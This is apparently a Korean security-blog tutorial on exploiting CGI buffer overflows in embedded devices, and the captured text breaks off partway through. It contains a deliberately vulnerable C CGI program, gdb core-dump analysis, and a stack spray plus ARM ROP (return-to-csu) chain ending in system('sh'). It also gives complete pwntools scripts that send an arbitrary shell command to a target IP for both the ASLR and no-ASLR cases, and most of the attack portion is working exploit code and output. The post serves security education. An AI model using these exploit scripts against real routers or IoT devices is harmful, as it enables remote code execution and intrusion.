<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta property="og:type" content="article">
<meta property="og:image" content="http://ufo.stealien.com/assets/og_image.png">
<meta property="og:title" content="STEALIEN Technical Blog">
<meta property="og:description" content="Common ways to exploit CGI Buffer overflow.">
<link href="https://fonts.googleapis.com/css?family=Nunito+Sans:400,400i,700&display=swap" rel="stylesheet">
<title>Common ways to exploit CGI Buffer overflow.</title>
<!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Common ways to exploit CGI Buffer overflow. | STEALIEN Technical Blog</title>
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="Common ways to exploit CGI Buffer overflow." />
<meta name="author" content="김도현" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Common ways to exploit CGI Buffer overflow. 다양한 임베디드 서비스 및 IoT에서 사용되는 CGI 프로그램을 공격하는 일반적인 방법에 대해 알아 보겠습니다. Common Gateway Interface CGI는 웹 서버상에서 사용자 프로그램을 동작시키기 위한 조합입니다. 존재하는 많은 웹 서버 프로그램은 CGI의 기능을 이용할 수 있습니다. CGI는 환경변수나 표준입출력을 다룰 수 있는 프로그램 언어에서라면 언어의 구별을 묻지 않고 확장하여 이용하는 것이 가능하나, 실행속도나 텍스트 처리의 용이함 등의 균형에 의해 펄이 사용되는 경우가 많았습니다.[^1] CGI는 주로 Router, NAS와 같은 다양한 Embedded device, IoT Service를 위해 사용됩니다. | Server | +--------+ | +-------------+ +-------------+ | Client |&lt;=---HTTP---=&gt;| HTTP Server |&lt;=---=&gt;| CGI Program | +--------+ | +-------------+ +-------------+ | | CGI: How-to Lighttpd1와 같이 HTTP 프로토콜을 처리하여 CGI 프로그램으로 전달 할 수 있는 웹 서버 역할을 하는 프로그램을 한가지 선정합니다. 그 후에 CGI 규약에 맞게 프로그램을 작성하면 됩니다. 본 챕터에서는 공격하기 위해 알아야하는 몇가지를 설명하겠습니다. 환경변수 환경변수에는 HTTP 프로토콜을 통해 클라이언트에게 제공받은 정보가 저장됩니다. 임의로 변조된 사용자의 값이 전달 될 수 있는 벡터는 다음과 같습니다.2 HTTP_COOKIE : 클라이언트의 Cookie입니다. HTTP_USER_AGENT : 클라이언트의 User agent입니다. QUERY_STRING : 클라이언트에게 제공받은 GET 쿼리 문자열입니다. 표준입출력 표준 출력을 통해 cgi 페이지로 접근한 클라이언트에게 그 내용을 전달할 수 있습니다. POST와 같은 HTTP Method를 서비스 하기 위해 CGI에서는 표준입력을 사용합니다. POST의 데이터를 전달 받기 위해서는 단순히 표준입력을 받기만 하면 우리는 POST를 통해 전달 된 데이터를 받아낼 수 있습니다. CGI 공격 vuln.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; char *param; int param_count; static inline char h2c(char h) // F -&gt; 15 { if (h &gt;= &#39;a&#39; &amp;&amp; h &lt;= &#39;f&#39;) return h - &#39;a&#39; + 0xa; if (h &gt;= &#39;A&#39; &amp;&amp; h &lt;= &#39;F&#39;) return h - &#39;A&#39; + 0xa; return h - &#39;0&#39;; } char u2c(char *u) // %00 -&gt; \x00 { char ret = 0; if (*u == &#39;%&#39;) { ret += h2c(*(u+1)) * 0x10; ret += h2c(*(u+2)) * 0x01; } return ret; } int urldecode(char *s) { int index1 = 0; int index2 = 0; if (!s) return 1; if (s[index2] == &#39;?&#39;) index2++; param = s; param_count = 0; while (s[index2]) { if (s[index2] == &#39;%&#39;) { s[index1++] = u2c(s+index2); index2 += 3; } else if (s[index2] == &#39;&amp;&#39;) { s[index1++] = &#39;\0&#39;; index2++; } else { if (s[index2] == &#39;=&#39;) param_count++; s[index1++] = s[index2++]; } } s[index1] = &#39;\0&#39;; return 0; } int get_val(char *name, char *dest, size_t size) { int err = 1; char *param_c = param; size_t param_len = strlen(param_c); size_t name_len = strlen(name); if (!param || !param_count) { printf(&quot;no query.\n&quot;); return 1; } for (int i = 0; i &lt; param_count; i++) { if (!memcmp(name, param_c, name_len) &amp;&amp; param_c[name_len] == &#39;=&#39;) { param_c += name_len + 1; strncpy(dest, param_c, size); err = 0; break; } else { param_c += param_len+1; param_len = strlen(param_c); } } return err; } int main(int argc, char **argv, char **envp) { char out[512]; char cmd[256]; char buf[256]; if (urldecode(getenv(&quot;QUERY_STRING&quot;))) { printf(&quot;urldecode error.\n&quot;); return -1; } memset(out, 0, sizeof(out)); memset(cmd, 0, sizeof(cmd)); memset(buf, 0, sizeof(buf)); if (!get_val(&quot;time&quot;, buf, sizeof(buf)) &amp;&amp; buf[0] == &#39;y&#39;) strcat(cmd, &quot;echo &#39;- time ------&#39; &gt;&gt; /tmp/out &amp;&amp; date &gt;&gt; /tmp/out;&quot;); if (!get_val(&quot;ifconfig&quot;, buf, sizeof(buf)) &amp;&amp; buf[0] == &#39;y&#39;) strcat(cmd, &quot;echo &#39;- ifconfig --&#39; &gt;&gt; /tmp/out &amp;&amp; ifconfig bond0 &gt;&gt; /tmp/out;&quot;); if (!get_val(&quot;uname&quot;, buf, sizeof(buf)) &amp;&amp; buf[0] == &#39;y&#39;) strcat(cmd, &quot;echo &#39;- uname -----&#39; &gt;&gt; /tmp/out &amp;&amp; uname -a &gt;&gt; /tmp/out;&quot;); system(&quot;rm -f /tmp/out&quot;); system(cmd); int fd; if ((fd = open(&quot;/tmp/out&quot;, O_RDONLY)) &lt; 0) return -1; read(fd, out, sizeof(out)); close(fd); if (!get_val(&quot;comment&quot;, buf, 0x100)) strcat(out, buf); puts(out); return 0; } 위 샘플 코드는 시스템의 time, ifconfig, uname의 결과값을 출력 해 주는 간단한 프로그램입니다. L109 QUERY_STRING을 통해 인풋 받는 GET Query의 디코딩을 처리합니다. L119~124 time, ifconfig, uname을 실행하는 명령어 조합을 cmd 버퍼에 복사합니다. L126~127 /tmp/out을 삭제 후 cmd 버퍼의 내용대로 명령어를 실행합니다. L129~133 /tmp/out 파일을 읽어 out버퍼에 복사합니다. L135~136 comment 의 값이 유효할 경우 그 값을 out 버퍼에 복사합니다. L138 out을 출력합니다. L136에서 strncat 대신 strcat3을 사용하기 때문에, out 버퍼에 이미 많은 양의 데이터가 채워져 있을 경우의 예외를 처리하지 않습니다. 이로 인해 Buffer overflow4가 발생하게 됩니다. 취약점 증명 취약점을 증명하기 위해 간단히 웹 브라우저를 사용할 수 있습니다. 위는 정상적인 프로그램의 실행 흐름을 나타냅니다. 위는 다수의 데이터를 comment 파라미터를 통해 전달 할 경우를 보여줍니다. Lighttpd의 경우 다음과 같이 core dump를 활성화 시킬 수 있습니다. cgi 프로그램이 존재하는 디렉토리에 core dump가 생성됩니다. $ echo &#39;server.core-files = &quot;enable&quot;&#39; &gt;&gt; /etc/lighttpd.conf $ kill -9 `pidof lighttpd` $ lighttpd -f /etc/lighttpd.conf -m /usr/local/lib 그 후, 해당 프로그램의 core dump를 확인합니다. /home/314ckC47 # ./gdb -q -c /path/to/core [New LWP 6007] Core was generated by `vuln.cgi&#39;. Program terminated with signal 11, Segmentation fault. #0 0x61616160 in ?? () (gdb) i r pc pc 0x61616160 0x61616160 $pc 레지스터가 변조 된 것을 알 수 있습니다. 공격 제약 일반적인 BOF 공격은 Return Oriented Programming(ROP)5을 주로 사용합니다. 하지만 이번 취약점을 공격하기에는 몇가지 제약이 있습니다. 문자열 복사를 통해 발생하는 Buffer overflow이기 때문에, ROP Payload에 Null byte가 포함 될 경우 성공적으로 공격을 수행할 수 없습니다. 공격에 사용할 수 있는 정적인 주소가 프로그램(vuln.cgi)이 로드 된 지점밖에 없습니다. 프로그램이 로드 된 주소값의 상위 1바이트는 Null-byte입니다. 이런 상황에서 구상할 수 있는 Payload는 다음과 같습니다. &lt;= 0x00000000 0xffffffff =&gt; +-----+-(out)---------------+-(BP)-+-(PC)-+-----+ | ... | ............ &#39;a&#39;*63 | BASE | JUMP | ... | +-----+---------------------+------+------+-----+ === Overflow ==&gt; JUMP에는 상위 1바이트가 Null-byte인 주소값을 삽입할 수 있습니다. BASE에는 Null-byte가 존재하지 않는 어떤 값을 삽입할 수 있습니다. 이런 모든 조건을 종합 해 보았을 때, 우리는 다음과 같이 공격을 구상해야합니다. PC를 단 한번 변조하여 공격자가 원하는 코드의 흐름을 획득 해야합니다. 연속적인 함수의 호출 또는 인자의 구성을 위해 Null-byte를 삽입할 수 있는 영역이 필요합니다. 연속적인 함수의 호출 또는 인자의 구성을 위해 SP를 변조할 수 있어야 합니다. Stack spray QUERY_STRING 환경변수는 스택에 저장되어 있습니다. 이를 활용하면 다음과 같이 Stack spray를 시도 할 수 있습니다. #!/usr/bin/python3 from pwn import * e = ELF(&quot;./vuln&quot;) def form_packet(ip, param): packet = &quot;&quot; packet += &quot;GET http://{}/vuln.cgi?{} HTTP/1.1\r\n&quot;.format(ip, param) packet += &quot;Host: {}\r\n&quot;.format(ip) packet += &quot;Connection: keep-alive\r\n&quot; packet += &quot;Content-Length: 0\r\n&quot; packet += &quot;User-Agent: Mozilla/5.0\r\n&quot; packet += &quot;Accept: */*\r\n&quot; packet += &quot;Origin: http://{}\r\n&quot;.format(ip) packet += &quot;Referer: http://{}/home.cgi\r\n&quot;.format(ip) packet += &quot;Accept-Encoding: gzip, deflate\r\n&quot; packet += &quot;Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\n&quot; packet += &quot;\r\n&quot; return packet.encode() def form_param(payload, spray): return &quot;&amp;&quot;.join([&quot;ifconfig=y&quot;, &quot;comment=&quot;+payload, &quot;s=&quot;+spray]) def exploit(ip): payload = &#39;a&#39;*63 + &quot;STCK&quot; + &quot;JUMP&quot; spray = &#39;b&#39;*0x10000 param = form_param(payload, spray) packet = form_packet(ip, param) p = remote(ip, 80) p.send(packet) r = p.recv(1024).decode() log.info(r) p.close() if __name__ == &quot;__main__&quot;: if (len(sys.argv) == 2): exploit(sys.argv[1]) else: print(&quot;{} [target-ip]&quot;.format(sys.argv[0])) 실제로 스택에 스프레이가 되었는지 확인합니다. (gdb) x/16wx $sp+0x380 0xbec65db8: 0x61616161 0x61616161 0x61616161 0x61616161 0xbec65dc8: 0x64646161 0x44446464 0x73004444 0x6262623d 0xbec65dd8: 0x62626262 0x62626262 0x62626262 0x62626262 0xbec65de8: 0x62626262 0x62626262 0x62626262 0x62626262 (gdb) x/16wx $sp+0x380+0x10000 0xbec75db8: 0x62626262 0x62626262 0x62626262 0x62626262 0xbec75dc8: 0x62626262 0x62626262 0x62626262 0x45520062 0xbec75dd8: 0x53455551 0x52555f54 0x762f3d49 0x2e6e6c75 0xbec75de8: 0x3f696763 0x6f636669 0x6769666e 0x6326793d (gdb) 스프레이가 잘 되었음을 확인 했습니다. 또한 Null-byte의 삽입이 가능한지의 여부를 확인합니다. # ... def exploit(ip): payload = &#39;a&#39;*63 + &#39;dddd&#39; + &#39;DDDD&#39; spray = &#39;%00&#39;*4 + &#39;b&#39;*(0x10000-12) param = form_param(payload, spray) packet = form_packet(ip, param) # ... 4바이트의 null을 삽입 해 봅니다. (gdb) x/16wx $sp+0x380 0xbed44db8: 0x61616161 0x61616161 0x61616161 0x61616161 0xbed44dc8: 0x64646161 0x44446464 0x73004444 0x0000003d 0xbed44dd8: 0x62626200 0x62626262 0x62626262 0x62626262 0xbed44de8: 0x62626262 0x62626262 0x62626262 0x62626262 (gdb) x/16wx $sp+0x380+0x10000 0xbed54db8: 0x62626262 0x62626262 0x62626262 0x62626262 0xbed54dc8: 0x62626262 0x62620062 0x62626262 0x45520062 0xbed54dd8: 0x53455551 0x52555f54 0x762f3d49 0x2e6e6c75 0xbed54de8: 0x3f696763 0x6f636669 0x6769666e 0x6326793d (gdb) Null-byte를 삽입할 수 있는 영역임을 확인 했습니다. Stack Pointer 변조 armv7에서 R11 레지스터는 x86의 ebp와 같은 역할을 수행합니다. (gdb) disas main ... 0x00010c9c &lt;+624&gt;: mov r0, r3 // -- main epilogue -- 0x00010ca0 &lt;+628&gt;: sub sp, r11, #4 // r11(bp)에서 4를 뺀 값을 sp에 저장합니다. 0x00010ca4 &lt;+632&gt;: pop {r11, pc} // 스택에서 r11, pc를 순차적으로 pop합니다. ... 이를 활용하면 Stack pointer(sp)를 변조할 수 있습니다. 아래와 같은 순서의 명령을 수행한다고 가정합니다. ### Stage 1 ###################################################### +-Code-------------+---------------------------------------------+ | pc &gt; 0x00010ca0 | sub sp, r11, #4 | | 0x00010ca4 | pop {r11, pc} | +------------------+---------------------------------------------+ +-Stack------------+----------0----------4----------8----------c-+ | 0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 | | 0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 | | 0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 | +------------------+---------------------------------------------+ +-Register-------------------------------------------------------+ | sp 0xbfff8f00 | | r11 0xbfff8f14 | +----------------------------------------------------------------+ ### Stage 2 ###################################################### +-Code-------------+---------------------------------------------+ | 0x00010ca0 | sub sp, r11, #4 | | pc &gt; 0x00010ca4 | pop {r11, pc} | +------------------+---------------------------------------------+ +-Stack------------+----------0----------4----------8----------c-+ | 0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 | | 0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 | | 0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 | +------------------+---------------------------------------------+ +-Register-------------------------------------------------------+ | sp 0xbfff8f10 * | | r11 0xbfff8f14 | +----------------------------------------------------------------+ * r11에서 4를 뺀 값을 sp에 넣었습니다. ### Stage 3 ###################################################### +-Code-------------+---------------------------------------------+ | pc &gt; 0x00010ca0 | sub sp, r11, #4 | | 0x00010ca4 | pop {r11, pc} | +------------------+---------------------------------------------+ +-Stack------------+----------0----------4----------8----------c-+ | 0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 | | 0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 | | 0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 | +------------------+---------------------------------------------+ +-Register-------------------------------------------------------+ | sp 0xbfff8f10 | | r11 0xbfff8f24 * | +----------------------------------------------------------------+ * sp(0xbfff8f10)에서 r11, pc를 pop 했습니다. ### Stage 4 ###################################################### +-Code-------------+---------------------------------------------+ | 0x00010ca0 | sub sp, r11, #4 | | pc &gt; 0x00010ca4 | pop {r11, pc} | +------------------+---------------------------------------------+ +-Stack------------+----------0----------4----------8----------c-+ | 0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 | | 0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 | | 0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 | +------------------+---------------------------------------------+ +-Register-------------------------------------------------------+ | sp 0xbfff8f20 * | | r11 0xbfff8f24 | +----------------------------------------------------------------+ * r11에서 4를 뺀 값을 sp에 넣었습니다. sp의 값이 우리가 원하는 값(0xbfff8f20)으로 변조되었습니다. ### Stage 5 ###################################################### +-Code-------------+---------------------------------------------+ | pc &gt; 0x41414141 | ........................................... | +------------------+---------------------------------------------+ +-Stack------------+----------0----------4----------8----------c-+ | 0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 | | 0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 | | 0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 | +------------------+---------------------------------------------+ +-Register-------------------------------------------------------+ | sp 0xbfff8f28 | | r11 0x41414141 | +----------------------------------------------------------------+ * pc와 r11이 변조되었습니다. 위와 같은 방법으로 연속적인 함수의 호출 또는 인자의 구성을 위해 SP를 변조할 수 있습니다. 공격코드 작성 위 두가지 방법을 이용하면 다음과 같은 흐름으로 공격을 수행합니다. QUERY_STRING을 전달함으로 BOF를 발생시키고, 스택에 ROP Payload를 spray합니다. SP를 Stack spray된 영역으로 변조합니다. ROP Payload를 수행합니다. ASLR이 비활성화 되어있으면, ROP Payload를 즉각적으로 수행 할 수 있습니다. ASLR이 활성화 되어있으면, SP가 잘못된 영역을 역참조 할 수 있습니다. 이럴경우, 1을 다시 수행합니다. Case: ASLR 비활성화 다음과 같이 ASLR을 비활성화 할 수 있습니다. # echo 0 &gt; /proc/sys/kernel/randomize_va_space # cat /proc/sys/kernel/randomize_va_space 0 ASLR이 비활성화 된 후, 스프레이를 먼저 수행하여 core dump를 확인합니다. (gdb) x/32wx $sp+0x380 0xbefe1d98: 0x6161616b 0x6161616c 0x6161616d 0x6161616e 0xbefe1da8: 0xbefe1ddc 0x44444444 0x3d737300 0x41414141 0xbefe1db8: 0x41414141 0x41414141 0x41414141 0x41414141 0xbefe1dc8: 0x41414141 0x41414141 0x41414141 0x41414141 0xbefe1dd8: 0x41414141 0x41414141 0x41414141 0x41414141 Stack spray가 0xbefe1db4에서 시작합니다. 해당 주소로 sp를 변조합니다. SPRAY_LEN = 0xf000 leave = 0x00010ca0 # sub sp, r11, 4; pop {r11, pc} def payload(r11, lr, dummy_len): payload = cyclic(dummy_len).decode() payload += purl32(r11) payload += purl32(lr) return payload def spray(): spray = &quot;A&quot;*SPRAY_LEN return spray def exploit(): # ... stack = 0xbefe1db4+4 pload = payload(stack, leave, dummy_len) param = form_param(pload, spray()) packet = form_packet(ip, param, command) # ... 위의 코드를 실행 후 다시 gdb로 확인합니다. (gdb) x/16wx $sp-0x10 0xbefe1dac: 0x00010ca0 0x3d737300 0x41414141 0x41414141 0xbefe1dbc: 0x41414141 0x41414141 0x41414141 0x41414141 0xbefe1dcc: 0x41414141 0x41414141 0x41414141 0x41414141 0xbefe1ddc: 0x41414141 0x41414141 0x41414141 0x41414141 (gdb) i r pc pc 0x41414140 0x41414140 (gdb) 정상적으로 pc가 변조되었습니다. Return sled Return sled를 이용하여 스프레이한 영역의 어느곳으로 sp, pc가 변조되어도 공격자의 ROP Payload가 실행되도록 합니다. 0x00010ca4: pop {r11, pc} 0x000108e0: pop {r4, r11, pc} 위의 두 가젯을 활용합니다. ... | 0x00010ca4 | 0x00010ca4 | 0x000108e0 | 0x00010ca4 # r4 | 0x41414141 # r11 V [ROP HERE] # pc def spray(): # ... spray += purl32(sled_1) * (((SPRAY_LEN-len(rop)) // EADDR_LEN)-3) spray += purl32(sled_2) + purl32(sled_1) + &quot;AAAA&quot; spray += rop return spray ROP Return-to-csu를 활용합니다. def chain(func, r0, r1, r2): c = &#39;&#39; c += purl32(0x00000000) # r4 c += purl32(func) # [r5] =&gt; r3 c += purl32(0x00000000) # r6 c += purl32(r0) # r7 =&gt; r0 c += purl32(r1) # r8 =&gt; r1 c += purl32(r2) # r9 =&gt; r2 c += purl32(0x00000000) # r10 c += purl32(csu_2) # pc return c def spray(): #... # Return-to-csu. rop = purl32(csu_1) # Set bss:0x20 to get_val address. for i in range(4): addr = e.bss(0x20+i) value = e.symbols[&#39;get_val&#39;] &gt;&gt; (i*8) &amp; 0xff rop += chain(e.got[&#39;memset&#39;], addr, value, 1) # get_val(&quot;t&quot;, bss:0x24, 2): returns &quot;sh&quot; rop += chain(e.bss(0x20), str_t, e.bss(0x24), 2) # get_val rop += chain(e.got[&#39;system&#39;], e.bss(0x24), 0, 0) #... chain() 함수는 Return-to-csu 가젯을 자동으로 구성 해 줍니다. L18~22 : bss:0x20 지점에 get_val 함수의 포인터를 작성합니다. L25 : get_val 함수를 이용해 QUERY_STRING에서 t 쿼리의 값을 bss:0x24 지점에 작성합니다. 그 값은 &quot;sh&quot; 입니다. L26 : system 함수를 이용해 쉘을 실행시킵니다. 명령어 전달 ROP Payload가 수행되고 나면, 쉘 프로세스가 실행되고, 명령어 입력까지 대기합니다. POST 메소드를 이용해 Standard input으로 쉘 명령을 전달하여 실행시킵니다. def form_packet(ip, param, content=&#39;&#39;): packet = &quot;&quot; packet += &quot;POST http://{}/vuln.cgi?{} HTTP/1.1\r\n&quot;.format(ip, param) packet += &quot;Host: {}\r\n&quot;.format(ip) packet += &quot;Connection: keep-alive\r\n&quot; packet += &quot;Content-Length: {}\r\n&quot;.format(len(content)) packet += &quot;User-Agent: Mozilla/5.0\r\n&quot; packet += &quot;Accept: */*\r\n&quot; packet += &quot;Origin: http://{}\r\n&quot;.format(ip) packet += &quot;Referer: http://{}/home.cgi\r\n&quot;.format(ip) packet += &quot;Accept-Encoding: gzip, deflate\r\n&quot; packet += &quot;Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\n&quot; packet += &quot;\r\n&quot; packet += content packet += &quot;\r\n&quot; return packet.encode() 안정화 작업 def exploit(ip, command): # ifconfig&#39;s output length is not fixed. # So, we need to get the buffer first to calculate # the overflow size. log.info(&quot;Getting buffer.&quot;) packet = form_packet(ip, form_param()) p = remote(ip, 80) p.send(packet) r = p.recv().decode() r = r[r.find(&quot;- ifconfig&quot;):r.find(&quot;\n\n\n&quot;)+2] dummy_len = 0x204 - len(r) p.close() log.info(&quot;Exploit.&quot;) stack = 0xbefe1db4+4 pload = payload(stack, leave, dummy_len) param = form_param(pload, spray()) packet = form_packet(ip, param, command) p = remote(ip, 80) p.send(packet) p.close() log.info(&quot;Success!&quot;) ifconfig 명령의 출력값의 길이가 고정되어있지 않습니다. 오버플로우 사이즈를 안정적으로 계산하기 위해 ifconfig 명령 결과 버퍼의 길이값을 측정하고, 계산합니다. no-ASLR 공격 코드 #!/usr/bin/python3 from pwn import * e = ELF(&quot;./vuln&quot;) # Globals &amp; Defines spray_fix = &#39;&#39; SPRAY_LEN = 0xf000 EADDR_LEN = 12 # Gadgets sled_1 = 0x00010ca4 # pop {r11, pc} sled_2 = 0x000108e0 # pop {r4, r11, pc} csu_1 = 0x00010d28 csu_2 = 0x00010d0c leave = 0x00010ca0 # sub sp, r11, 4; pop {r11, pc} # ETC. str_t = 0x10e66 def purl32(value): a = (value &amp; 0x000000ff) &gt;&gt; 0 b = (value &amp; 0x0000ff00) &gt;&gt; 8 c = (value &amp; 0x00ff0000) &gt;&gt; 16 d = (value &amp; 0xff000000) &gt;&gt; 24 return &quot;%{:02x}%{:02x}%{:02x}%{:02x}&quot;.format(a,b,c,d) def form_packet(ip, param, content=&#39;&#39;): packet = &quot;&quot; packet += &quot;POST http://{}/vuln.cgi?{} HTTP/1.1\r\n&quot;.format(ip, param) packet += &quot;Host: {}\r\n&quot;.format(ip) packet += &quot;Connection: keep-alive\r\n&quot; packet += &quot;Content-Length: {}\r\n&quot;.format(len(content)) packet += &quot;User-Agent: Mozilla/5.0\r\n&quot; packet += &quot;Accept: */*\r\n&quot; packet += &quot;Origin: http://{}\r\n&quot;.format(ip) packet += &quot;Referer: http://{}/home.cgi\r\n&quot;.format(ip) packet += &quot;Accept-Encoding: gzip, deflate\r\n&quot; packet += &quot;Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\n&quot; packet += &quot;\r\n&quot; packet += content packet += &quot;\r\n&quot; return packet.encode() def form_param(payload=&#39;&#39;, spray=&#39;&#39;): p = [&quot;t=sh&quot;, &quot;ifconfig=y&quot;] if payload: p.append(&quot;comment=&quot;+payload) if spray: p.append(&quot;ss=&quot;+spray) return &quot;&amp;&quot;.join(p) def payload(r11, lr, dummy_len=54): payload = cyclic(dummy_len).decode() payload += purl32(r11) payload += purl32(lr) return payload def chain(func, r0, r1, r2): c = &#39;&#39; c += purl32(0x00000000) # r4 c += purl32(func) # [r5] =&gt; r3 c += purl32(0x00000000) # r6 c += purl32(r0) # r7 =&gt; r0 c += purl32(r1) # r8 =&gt; r1 c += purl32(r2) # r9 =&gt; r2 c += purl32(0x00000000) # r10 c += purl32(csu_2) # pc return c def spray(): # If we already got spray buffer, use it. global spray_fix if len(spray_fix): return spray_fix # Return-to-csu. rop = purl32(csu_1) # Set bss:0x20 to get_val address. for i in range(4): addr = e.bss(0x20+i) value = e.symbols[&#39;get_val&#39;] &gt;&gt; (i*8) &amp; 0xff rop += chain(e.got[&#39;memset&#39;], addr, value, 1) # get_val(&quot;t&quot;, bss:0x24, 2): returns &quot;sh&quot; rop += chain(e.bss(0x20), str_t, e.bss(0x24), 2) # get_val # system(&quot;sh&quot;) rop += chain(e.got[&#39;system&#39;], e.bss(0x24), 0, 0) # Forming spray. spray = &#39;a&#39; * (SPRAY_LEN % EADDR_LEN) # padd spray += purl32(sled_1) * (((SPRAY_LEN-len(rop)) // EADDR_LEN)-3) spray += purl32(sled_2) + purl32(sled_1) + &quot;AAAA&quot; spray += rop # Fix the spray buffer. spray_fix = spray return spray def exploit(ip, command): # ifconfig&#39;s output length is not fixed. # So, we need to get the buffer first to calculate # the overflow size. log.info(&quot;Getting buffer.&quot;) packet = form_packet(ip, form_param()) p = remote(ip, 80) p.send(packet) r = p.recv().decode() r = r[r.find(&quot;- ifconfig&quot;):r.find(&quot;\n\n\n&quot;)+2] dummy_len = 0x204 - len(r) p.close() log.info(&quot;Exploit.&quot;) stack = 0xbefe1db4+4 pload = payload(stack, leave, dummy_len) param = form_param(pload, spray()) packet = form_packet(ip, param, command) p = remote(ip, 80) p.send(packet) p.close() log.info(&quot;Success!&quot;) if __name__ == &quot;__main__&quot;: if (len(sys.argv) == 3): exploit(sys.argv[1], sys.argv[2]) else: print(&quot;{} [target-ip] [shell command]&quot;.format(sys.argv[0])) bc@machine $ ./exploit.py 172.16.13.9 &#39;echo PWNED &gt; /tmp/pwned&#39; [*] &#39;/mnt/c/Users/314ckC47/Documents/CGI Exploitation/source/vuln&#39; Arch: arm-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x10000) [*] Getting buffer. [*] Exploit. [*] Success! /home/314ckC47 $ cat /tmp/pwned PWNED Case: ASLR 활성화 다음과 같이 ASLR을 활성화합니다. # echo 0 &gt; /proc/sys/kernel/randomize_va_space # cat /proc/sys/kernel/randomize_va_space 0 종료 조건 sp가 참조하는 지점에 대해 Brute-forcing을 수행합니다. Brute-forcing의 종료 조건을 위해 ROP Payload가 성공적으로 수행 될 경우 프로그램을 abort시켜 500 Internal error를 발생시키지 않도록 합니다. # system(&quot;sh&quot;) rop += chain(e.got[&#39;system&#39;], e.bss(0x24), 0, 0) # abort rop += &quot;AAAA&quot;*7 + purl32(abort) ASLR 공격 코드 #!/usr/bin/python3 from pwn import * e = ELF(&quot;./vuln&quot;) # Globals &amp; Defines spray_fix = &#39;&#39; SPRAY_LEN = 0xf000 EADDR_LEN = 12 # Gadgets sled_1 = 0x00010ca4 # pop {r11, pc} sled_2 = 0x000108e0 # pop {r4, r11, pc} csu_1 = 0x00010d28 csu_2 = 0x00010d0c leave = 0x00010ca0 # sub sp, r11, 4; pop {r11, pc} # ETC. str_t = 0x00010e66 abort = 0x0001055c def purl32(value): a = (value &amp; 0x000000ff) &gt;&gt; 0 b = (value &amp; 0x0000ff00) &gt;&gt; 8 c = (value &amp; 0x00ff0000) &gt;&gt; 16 d = (value &amp; 0xff000000) &gt;&gt; 24 return &quot;%{:02x}%{:02x}%{:02x}%{:02x}&quot;.format(a,b,c,d) def form_packet(ip, param, content=&#39;&#39;): packet = &quot;&quot; packet += &quot;POST http://{}/vuln.cgi?{} HTTP/1.1\r\n&quot;.format(ip, param) packet += &quot;Host: {}\r\n&quot;.format(ip) packet += &quot;Connection: keep-alive\r\n&quot; packet += &quot;Content-Length: {}\r\n&quot;.format(len(content)) packet += &quot;User-Agent: Mozilla/5.0\r\n&quot; packet += &quot;Accept: */*\r\n&quot; packet += &quot;Origin: http://{}\r\n&quot;.format(ip) packet += &quot;Referer: http://{}/home.cgi\r\n&quot;.format(ip) packet += &quot;Accept-Encoding: gzip, deflate\r\n&quot; packet += &quot;Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\n&quot; packet += &quot;\r\n&quot; packet += content packet += &quot;\r\n&quot; return packet.encode() def form_param(payload=&#39;&#39;, spray=&#39;&#39;): p = [&quot;t=sh&quot;, &quot;ifconfig=y&quot;] if payload: p.append(&quot;comment=&quot;+payload) if spray: p.append(&quot;ss=&quot;+spray) return &quot;&amp;&quot;.join(p) def payload(r11, lr, dummy_len=54): payload = cyclic(dummy_len).decode() payload += purl32(r11) payload += purl32(lr) return payload def chain(func, r0, r1, r2): c = &#39;&#39; c += purl32(0x00000000) # r4 c += purl32(func) # [r5] =&gt; r3 c += purl32(0x00000000) # r6 c += purl32(r0) # r7 =&gt; r0 c += purl32(r1) # r8 =&gt; r1 c += purl32(r2) # r9 =&gt; r2 c += purl32(0x00000000) # r10 c += purl32(csu_2) # pc return c def spray(): # If we already got spray buffer, use it. global spray_fix if len(spray_fix): return spray_fix # Return-to-csu. rop = purl32(csu_1) # Set bss:0x20 to get_val address. for i in range(4): addr = e.bss(0x20+i) value = e.symbols[&#39;get_val&#39;] &gt;&gt; (i*8) &amp; 0xff rop += chain(e.got[&#39;memset&#39;], addr, value, 1) # get_val(&quot;t&quot;, bss:0x24, 2): returns &quot;sh&quot; rop += chain(e.bss(0x20), str_t, e.bss(0x24), 2) # get_val # system(&quot;sh&quot;) rop += chain(e.got[&#39;system&#39;], e.bss(0x24), 0, 0) # abort rop += &quot;AAAA&quot;*7 + purl32(abort) # Forming spray. spray = &#39;a&#39; * (SPRAY_LEN % EADDR_LEN) # padd spray += purl32(sled_1) * (((SPRAY_LEN-len(rop)) // EADDR_LEN)-3) spray += purl32(sled_2) + purl32(sled_1) + &quot;AAAA&quot; spray += rop # Fix the spray buffer. spray_fix = spray return spray def exploit(ip, command): # ifconfig&#39;s output length is not fixed. # So, we need to get the buffer first to calculate # the overflow size. log.info(&quot;Getting buffer.&quot;) packet = form_packet(ip, form_param()) p = remote(ip, 